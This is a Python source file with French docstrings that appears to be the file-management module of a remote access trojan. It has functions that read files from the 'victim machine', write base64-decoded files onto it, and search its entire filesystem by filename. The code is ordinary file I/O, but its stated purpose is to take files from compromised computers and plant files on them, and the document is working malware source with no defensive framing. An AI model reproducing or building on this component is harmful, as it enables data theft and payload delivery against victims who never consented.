"""Module de gestion des fichiers : download, upload, search."""

import base64
import logging
import os
import platform
from pathlib import Path
from typing import List, Tuple

logger = logging.getLogger(__name__)


def download_file(path: str) -> Tuple[bool, bytes, str]:
    """Télécharge un fichier de la machine victime.

    Args:
        path: Chemin absolu du fichier

    Returns:
        Tuple (succès, contenu_bytes, nom_du_fichier ou message d'erreur)
    """
    try:
        filepath = Path(path).resolve()

        if not filepath.exists():
            return False, b"", f"[!] Fichier introuvable : {path}"

        if not filepath.is_file():
            return False, b"", f"[!] Ce n'est pas un fichier : {path}"

        with open(filepath, "rb") as f:
            content = f.read()

        logger.info(f"Fichier téléchargé : {filepath.name} ({len(content)} octets)")
        return True, content, filepath.name

    except PermissionError:
        return False, b"", f"[!] Permission refusée : {path}"
    except Exception as e:
        logger.error(f"Erreur download : {e}")
        return False, b"", f"[!] Erreur : {e}"


def upload_file(path: str, content_b64: str) -> str:
    """Upload un fichier vers la machine victime.

    Args:
        path: Chemin de destination
        content_b64: Contenu encodé en base64

    Returns:
        Message de confirmation ou d'erreur
    """
    try:
        content = base64.b64decode(content_b64)
        filepath = Path(path).resolve()

        # Création des répertoires parents si nécessaire
        filepath.parent.mkdir(parents=True, exist_ok=True)

        with open(filepath, "wb") as f:
            f.write(content)

        logger.info(f"Fichier uploadé : {filepath} ({len(content)} octets)")
        return f"[+] Fichier uploadé avec succès : {filepath.name}"

    except Exception as e:
        logger.error(f"Erreur upload : {e}")
        return f"[!] Erreur upload : {e}"


def search_file(pattern: str, base_dir: str = None) -> List[str]:
    """Recherche un fichier sur la machine victime.

    Args:
        pattern: Motif de recherche (nom de fichier partiel)
        base_dir: Répertoire de base (racine système par défaut)

    Returns:
        Liste des chemins trouvés
    """
    if base_dir is None:
        if platform.system().lower() == "windows":
            base_dir = "C:\\"
        else:
            base_dir = "/"

    results = []
    pattern_lower = pattern.lower()

    try:
        logger.info(f"Recherche de '{pattern}' dans {base_dir}...")

        for root, dirs, files in os.walk(base_dir):
            # Limite de recherche pour éviter les blocages
            if len(results) >= 50:
                break

            for filename in files:
                if pattern_lower in filename.lower():
                    full_path = os.path.join(root, filename)
                    try:
                        size = os.path.getsize(full_path)
                        results.append(f"{full_path} ({size} octets)")
                    except (OSError, PermissionError):
                        results.append(full_path)

                    if len(results) >= 50:
                        break

        logger.info(f"Recherche terminée : {len(results)} résultat(s)")
        return results if results else ["[!] Aucun fichier trouvé"]

    except PermissionError:
        return ["[!] Permission refusée pour accéder à certains répertoires"]
    except Exception as e:
        logger.error(f"Erreur recherche : {e}")
        return [f"[!] Erreur lors de la recherche : {e}"]